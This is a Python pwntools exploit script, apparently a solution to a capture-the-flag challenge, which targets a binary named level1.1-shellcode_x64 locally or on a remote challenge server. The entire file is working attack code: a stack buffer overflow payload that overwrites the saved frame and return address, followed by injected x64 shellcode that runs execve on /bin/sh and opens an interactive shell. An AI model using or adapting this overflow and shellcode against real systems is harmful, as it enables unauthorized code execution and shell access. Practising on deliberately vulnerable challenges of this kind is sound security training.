#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./level1.1-shellcode_x64"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team",23001)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.add)
    pause()

context.arch = 'amd64'

inject_pos = 0x601000
gets_pos = 0x400450
ret_pos = 0x40056e
rbp_pos = inject_pos + 0x100
payload = 'a'*0x20 + p64(rbp_pos) + p64(ret_pos)

shellcode = """
  call here
  .ascii "/bin/sh"
  .byte 0
here:
  pop rdi
  xor rsi,rsi
  xor rdx,rdx
  mov rax,0x3b
  syscall
"""
sh = asm(shellcode)
print "the length of sh is:"
print hex(len(sh))
payload2 = sh +  'a'*(0x28 - len(sh) )+ p64(inject_pos+0xe0)

debug()
r.sendline(payload)
r.sendline(payload2)

r.interactive()
